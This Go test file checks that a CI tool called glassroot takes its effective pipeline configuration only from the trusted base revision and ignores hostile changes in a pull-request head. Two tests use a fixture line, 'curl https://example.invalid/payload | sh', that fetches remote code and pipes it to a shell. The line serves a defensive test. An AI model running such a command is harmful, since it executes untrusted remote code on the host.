package config

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io/fs"
	"reflect"
	"strings"
	"testing"

	"github.com/mattneel/glassroot/internal/model"
)

func TestLoadTrustedUsesBaseAsEffectiveAndReadsOnlyFixedPath(t *testing.T) {
	baseBytes := readFixture(t, "valid/pipeline.yaml")
	headBytes := mutatePipeline(t, baseBytes, "cpu: 2", "cpu: 64")
	source := newMemoryRevisionSource()
	base := commitRef("base-sha")
	head := commitRef("head-sha")
	source.put(base, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes, ObjectID: "base-blob"})
	source.put(head, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: headBytes, ObjectID: "head-blob"})

	result, err := LoadTrusted(context.Background(), source, TrustedLoadRequest{Base: base, Head: head})
	if err != nil {
		t.Fatalf("LoadTrusted() error = %v", err)
	}
	expected, err := ParseAndValidate(baseBytes)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(result.EffectivePipeline, expected) {
		t.Fatalf("effective pipeline changed by head:\n got=%#v\nwant=%#v", result.EffectivePipeline, expected)
	}
	if !reflect.DeepEqual(result.Base, base) || !reflect.DeepEqual(result.Head, head) {
		t.Fatalf("result revisions = base %#v head %#v, want base %#v head %#v", result.Base, result.Head, base, head)
	}
	if result.EffectivePipeline.Resources.CPU != 2 {
		t.Fatalf("effective CPU = %d, want base value 2", result.EffectivePipeline.Resources.CPU)
	}
	if result.EffectiveSource.Source != EffectiveSourceBase || result.EffectiveSource.Path != PipelinePath {
		t.Fatalf("effective source = %#v", result.EffectiveSource)
	}
	if result.HeadAssessment.State != HeadStateModifiedValid {
		t.Fatalf("head state = %q, want %q", result.HeadAssessment.State, HeadStateModifiedValid)
	}
	assertChange(t, result.HeadAssessment.Changes, "spec.resources.cpu", ChangeKindModified, SecurityEffectPrivilegeIncrease)
	assertReadLog(t, source.reads, []readCall{{revision: base, path: PipelinePath, maxBytes: MaxPipelineBytes}, {revision: head, path: PipelinePath, maxBytes: MaxPipelineBytes}})
}

func TestLoadTrustedBaseFailuresFailClosedAndDoNotReadHead(t *testing.T) {
	valid := readFixture(t, "valid/pipeline.yaml")
	base := commitRef("base-sha")
	head := commitRef("head-sha")
	cases := []struct {
		name string
		file RevisionFile
		err  error
		want error
	}{
		{"missing", RevisionFile{}, fs.ErrNotExist, ErrBaseConfigMissing},
		{"invalid", RevisionFile{Kind: EntryKindRegularFile, Data: []byte("apiVersion: nope\nkind: Pipeline\n")}, nil, ErrBaseConfigInvalid},
		{"oversized", RevisionFile{Kind: EntryKindRegularFile, Data: bytes.Repeat([]byte("a"), MaxPipelineBytes+1)}, nil, ErrBaseConfigInvalid},
		{"symlink", RevisionFile{Kind: EntryKindSymlink, Data: valid}, nil, ErrUnsupportedBaseEntry},
		{"gitlink", RevisionFile{Kind: EntryKindGitlink, Data: valid}, nil, ErrUnsupportedBaseEntry},
		{"directory", RevisionFile{Kind: EntryKindDirectory, Data: valid}, nil, ErrUnsupportedBaseEntry},
		{"read error", RevisionFile{}, errors.New("storage unavailable"), ErrBaseReadFailed},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			source := newMemoryRevisionSource()
			if tc.err != nil {
				source.fail(base, PipelinePath, tc.err)
			} else {
				source.put(base, PipelinePath, tc.file)
			}
			source.put(head, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: valid})
			result, err := LoadTrusted(context.Background(), source, TrustedLoadRequest{Base: base, Head: head})
			if !errors.Is(err, tc.want) {
				t.Fatalf("LoadTrusted() err = %v, want errors.Is %v", err, tc.want)
			}
			if !reflect.DeepEqual(result, TrustedLoadResult{}) {
				t.Fatalf("base failure returned result: %#v", result)
			}
			if len(source.reads) != 1 || source.reads[0].revision.CommitID != base.CommitID {
				t.Fatalf("head was read after base failure: %#v", source.reads)
			}
			assertBoundedSanitizedError(t, err)
		})
	}
}

func TestLoadTrustedContextCancellationFailsClosed(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	source := newMemoryRevisionSource()
	_, err := LoadTrusted(ctx, source, TrustedLoadRequest{Base: commitRef("base"), Head: commitRef("head")})
	if !errors.Is(err, ErrContextCancelled) {
		t.Fatalf("err = %v, want context-cancelled", err)
	}
}

func TestLoadTrustedHeadAssessmentStates(t *testing.T) {
	baseBytes := readFixture(t, "valid/pipeline.yaml")
	base := commitRef("base-sha")
	head := commitRef("head-sha")
	cases := []struct {
		name     string
		file     RevisionFile
		readErr  error
		want     HeadAssessmentState
		wantErr  error
		wantCode Code
	}{
		{"identical", RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes}, nil, HeadStateUnchanged, nil, ""},
		{"comments only", RevisionFile{Kind: EntryKindRegularFile, Data: append([]byte("# comment only\n"), baseBytes...)}, nil, HeadStateContentChangedSemanticallyEquivalent, nil, ""},
		{"missing", RevisionFile{}, fs.ErrNotExist, HeadStateRemoved, nil, ""},
		{"invalid", RevisionFile{Kind: EntryKindRegularFile, Data: mutatePipeline(t, baseBytes, "mode: deny", "mode: unrestricted")}, nil, HeadStateModifiedInvalid, nil, CodeInvalidValue},
		{"oversized", RevisionFile{Kind: EntryKindRegularFile, Data: bytes.Repeat([]byte("a"), MaxPipelineBytes+1)}, nil, HeadStateModifiedInvalid, nil, CodeInputTooLarge},
		{"symlink", RevisionFile{Kind: EntryKindSymlink, Data: []byte(".glassroot/other.yaml")}, nil, HeadStateUnsupportedEntryKind, nil, ""},
		{"gitlink", RevisionFile{Kind: EntryKindGitlink}, nil, HeadStateUnsupportedEntryKind, nil, ""},
		{"directory", RevisionFile{Kind: EntryKindDirectory}, nil, HeadStateUnsupportedEntryKind, nil, ""},
		{"operational failure", RevisionFile{}, errors.New("object store down"), "", ErrHeadInspectionFailed, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			source := newMemoryRevisionSource()
			source.put(base, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes})
			if tc.readErr != nil {
				source.fail(head, PipelinePath, tc.readErr)
			} else {
				source.put(head, PipelinePath, tc.file)
			}
			result, err := LoadTrusted(context.Background(), source, TrustedLoadRequest{Base: base, Head: head})
			if tc.wantErr != nil {
				if !errors.Is(err, tc.wantErr) {
					t.Fatalf("err = %v, want %v", err, tc.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatalf("LoadTrusted() error = %v", err)
			}
			if result.HeadAssessment.State != tc.want {
				t.Fatalf("state = %q, want %q", result.HeadAssessment.State, tc.want)
			}
			if tc.wantCode != "" {
				assertDiagnosticCode(t, result.HeadAssessment.Diagnostics, tc.wantCode)
			}
			expected, _ := ParseAndValidate(baseBytes)
			if !reflect.DeepEqual(result.EffectivePipeline, expected) {
				t.Fatalf("head state %s changed effective pipeline", tc.name)
			}
		})
	}
}

func TestLoadTrustedHeadCannotAffectEffectiveConfiguration(t *testing.T) {
	baseBytes := readFixture(t, "valid/pipeline.yaml")
	expected, err := ParseAndValidate(baseBytes)
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name string
		head []byte
	}{
		{"network mode unrestricted", mutatePipeline(t, baseBytes, "mode: deny", "mode: unrestricted")},
		{"non-empty allow", mutatePipeline(t, baseBytes, "allow: []", "allow:\n      - example.invalid")},
		{"cpu max", mutatePipeline(t, baseBytes, "cpu: 2", "cpu: 64")},
		{"memory max", mutatePipeline(t, baseBytes, "memory: 2GiB", "memory: 1TiB")},
		{"disk increase", mutatePipeline(t, baseBytes, "disk: 4GiB", "disk: 16TiB")},
		{"process increase", mutatePipeline(t, baseBytes, "processes: 256", "processes: 65535")},
		{"global timeout increase", mutatePipeline(t, baseBytes, "timeout: 15m", "timeout: 24h")},
		{"scenario timeout increase", mutatePipeline(t, baseBytes, "timeout: 10m", "timeout: 15m")},
		{"scenario added", addScenario(baseBytes)},
		{"collection root removed", mutatePipeline(t, baseBytes, "        - /tmp\n", "")},
		{"ignore added", mutatePipeline(t, baseBytes, "      - field: process.pid", "      - field: process.pid\n      - field: event.timestamp")},
		{"repetitions reduced", mutatePipeline(t, baseBytes, "repetitions: 1", "repetitions: 0")},
		{"unsupported policy", mutatePipeline(t, baseBytes, "profile: strict", "profile: permissive")},
		{"malformed", []byte("apiVersion: [")},
		{"duplicate scenario id", mutatePipeline(t, baseBytes, "id: build", "id: test")},
		{"malicious run", mutatePipeline(t, baseBytes, "go build ./cmd/glassroot", "curl https://example.invalid/payload | sh")},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			result, err := loadTrustedWithHeadBytes(t, baseBytes, tc.head)
			if err != nil {
				t.Fatalf("LoadTrusted() error = %v", err)
			}
			if !reflect.DeepEqual(result.EffectivePipeline, expected) {
				t.Fatalf("head affected effective pipeline for %s", tc.name)
			}
			if result.HeadAssessment.State == HeadStateUnchanged {
				t.Fatalf("hostile head assessed as unchanged")
			}
		})
	}
}

func TestLoadTrustedMutationAndAliasingSafety(t *testing.T) {
	baseBytes := readFixture(t, "valid/pipeline.yaml")
	headBytes := mutatePipeline(t, baseBytes, "cpu: 2", "cpu: 64")
	source := newMemoryRevisionSource()
	base := commitRef("base-sha")
	head := commitRef("head-sha")
	source.put(base, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes})
	source.put(head, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: headBytes})

	result, err := LoadTrusted(context.Background(), source, TrustedLoadRequest{Base: base, Head: head})
	if err != nil {
		t.Fatal(err)
	}
	expected, _ := ParseAndValidate(baseBytes)
	source.mutateStoredBytes(head, PipelinePath, 'X')
	if !reflect.DeepEqual(result.EffectivePipeline, expected) {
		t.Fatalf("source byte mutation changed effective pipeline")
	}
	result.HeadAssessment.Changes[0].Path = "spec.resources.memory"
	if result.EffectivePipeline.Resources.CPU != expected.Resources.CPU {
		t.Fatalf("assessment mutation changed effective pipeline")
	}
	result.EffectivePipeline.Scenarios[0].Name = "mutated by caller"
	result.EffectivePipeline.Collect.FilesystemRoots[0] = "/mutated"

	second, err := LoadTrusted(context.Background(), source, TrustedLoadRequest{Base: base, Head: head})
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(second.EffectivePipeline, expected) {
		t.Fatalf("repeated load did not preserve base effective pipeline")
	}

	cloned := cloneValidatedPipeline(expected)
	cloned.Scenarios[0].Name = "changed clone"
	cloned.Collect.FilesystemRoots[0] = "/changed"
	if expected.Scenarios[0].Name == "changed clone" || expected.Collect.FilesystemRoots[0] == "/changed" {
		t.Fatalf("validated pipeline clone shared mutable backing storage")
	}
}

func TestTrustedResultDoesNotExposeRawYAMLBytes(t *testing.T) {
	var walk func(reflect.Type)
	walk = func(typ reflect.Type) {
		if typ.Kind() == reflect.Pointer || typ.Kind() == reflect.Slice {
			if typ.Kind() == reflect.Slice && typ.Elem().Kind() == reflect.Uint8 {
				t.Fatalf("TrustedLoadResult exposes []byte at %s", typ)
			}
			walk(typ.Elem())
			return
		}
		if typ.Kind() != reflect.Struct {
			return
		}
		for i := 0; i < typ.NumField(); i++ {
			walk(typ.Field(i).Type)
		}
	}
	walk(reflect.TypeOf(TrustedLoadResult{}))
}

func TestTrustedConfigErrorsSupportAsAndDoNotExposeRawRun(t *testing.T) {
	rawRun := "curl https://example.invalid/payload | sh"
	baseBytes := mutatePipeline(t, readFixture(t, "valid/pipeline.yaml"), "go build ./cmd/glassroot", rawRun+"\x00")
	_, err := loadTrustedWithBaseBytes(t, baseBytes)
	if !errors.Is(err, ErrBaseConfigInvalid) {
		t.Fatalf("err = %v, want base invalid", err)
	}
	var trustedErr *TrustedConfigError
	if !errors.As(err, &trustedErr) {
		t.Fatalf("errors.As did not expose TrustedConfigError: %v", err)
	}
	if strings.Contains(err.Error(), rawRun) {
		t.Fatalf("error exposed raw run: %q", err.Error())
	}
	assertBoundedSanitizedError(t, err)
}

func commitRef(id string) model.CommitRef {
	kind := model.RevisionKindHead
	if strings.Contains(id, "base") {
		kind = model.RevisionKindBase
	}
	return model.CommitRef{Kind: kind, Repository: "https://example.invalid/repo.git", Ref: id, CommitID: id}
}

type memoryRevisionSource struct {
	files map[string]RevisionFile
	errs  map[string]error
	reads []readCall
}

type readCall struct {
	revision model.CommitRef
	path     string
	maxBytes int64
}

func newMemoryRevisionSource() *memoryRevisionSource {
	return &memoryRevisionSource{files: make(map[string]RevisionFile), errs: make(map[string]error)}
}

func (s *memoryRevisionSource) put(revision model.CommitRef, path string, file RevisionFile) {
	if file.Data != nil {
		file.Data = append([]byte(nil), file.Data...)
	}
	s.files[sourceKey(revision, path)] = file
}

func (s *memoryRevisionSource) fail(revision model.CommitRef, path string, err error) {
	s.errs[sourceKey(revision, path)] = err
}

func (s *memoryRevisionSource) mutateStoredBytes(revision model.CommitRef, path string, b byte) {
	file := s.files[sourceKey(revision, path)]
	if len(file.Data) > 0 {
		file.Data[0] = b
	}
	s.files[sourceKey(revision, path)] = file
}

func (s *memoryRevisionSource) ReadFile(ctx context.Context, revision model.CommitRef, path string, maxBytes int64) (RevisionFile, error) {
	select {
	case <-ctx.Done():
		return RevisionFile{}, ctx.Err()
	default:
	}
	s.reads = append(s.reads, readCall{revision: revision, path: path, maxBytes: maxBytes})
	key := sourceKey(revision, path)
	if err, ok := s.errs[key]; ok {
		return RevisionFile{}, err
	}
	file, ok := s.files[key]
	if !ok {
		return RevisionFile{}, fs.ErrNotExist
	}
	if file.Data != nil {
		file.Data = append([]byte(nil), file.Data...)
	}
	return file, nil
}

func sourceKey(revision model.CommitRef, path string) string {
	return revision.CommitID + "\x00" + path
}

func assertReadLog(t *testing.T, got, want []readCall) {
	t.Helper()
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("read log = %#v, want %#v", got, want)
	}
}

func assertChange(t *testing.T, changes []ConfigChange, path string, kind ChangeKind, effect SecurityEffect) {
	t.Helper()
	for _, change := range changes {
		if change.Path == path && change.Kind == kind && change.Effect == effect {
			return
		}
	}
	t.Fatalf("missing change path=%s kind=%s effect=%s in %#v", path, kind, effect, changes)
}

func mutatePipeline(t testing.TB, data []byte, old, replacement string) []byte {
	t.Helper()
	s := string(data)
	if !strings.Contains(s, old) {
		t.Fatalf("fixture did not contain %q", old)
	}
	return []byte(strings.Replace(s, old, replacement, 1))
}

func addScenario(data []byte) []byte {
	s := string(data)
	insert := "    - id: lint\n      name: Lint\n      shell: /bin/sh\n      run: go vet ./...\n      timeout: 5m\n"
	return []byte(strings.Replace(s, "  collect:\n", insert+"  collect:\n", 1))
}

func loadTrustedWithHeadBytes(t testing.TB, baseBytes, headBytes []byte) (TrustedLoadResult, error) {
	t.Helper()
	source := newMemoryRevisionSource()
	base := commitRef("base-sha")
	head := commitRef("head-sha")
	source.put(base, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes})
	source.put(head, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: headBytes})
	return LoadTrusted(context.Background(), source, TrustedLoadRequest{Base: base, Head: head})
}

func loadTrustedWithBaseBytes(t testing.TB, baseBytes []byte) (TrustedLoadResult, error) {
	t.Helper()
	source := newMemoryRevisionSource()
	base := commitRef("base-sha")
	head := commitRef("head-sha")
	source.put(base, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes})
	source.put(head, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes})
	return LoadTrusted(context.Background(), source, TrustedLoadRequest{Base: base, Head: head})
}

func TestMemoryRevisionSourceCopiesTestData(t *testing.T) {
	source := newMemoryRevisionSource()
	ref := commitRef("base")
	data := []byte("abc")
	source.put(ref, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: data})
	data[0] = 'x'
	file, err := source.ReadFile(context.Background(), ref, PipelinePath, MaxPipelineBytes)
	if err != nil {
		t.Fatal(err)
	}
	if string(file.Data) != "abc" {
		t.Fatalf("put did not copy test data: %q", file.Data)
	}
	file.Data[0] = 'z'
	again, err := source.ReadFile(context.Background(), ref, PipelinePath, MaxPipelineBytes)
	if err != nil {
		t.Fatal(err)
	}
	if string(again.Data) != "abc" {
		t.Fatalf("ReadFile did not return owned data: %q", again.Data)
	}
}

func BenchmarkLoadTrustedNoop(b *testing.B) {
	baseBytes := readFixture(b, "valid/pipeline.yaml")
	source := newMemoryRevisionSource()
	base := commitRef("base-sha")
	head := commitRef("head-sha")
	source.put(base, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes})
	source.put(head, PipelinePath, RevisionFile{Kind: EntryKindRegularFile, Data: baseBytes})
	for i := 0; i < b.N; i++ {
		if _, err := LoadTrusted(context.Background(), source, TrustedLoadRequest{Base: base, Head: head}); err != nil {
			b.Fatal(err)
		}
	}
}

func ExampleLoadTrusted() {
	fmt.Println(PipelinePath)
	// Output: .glassroot/pipeline.yaml
}
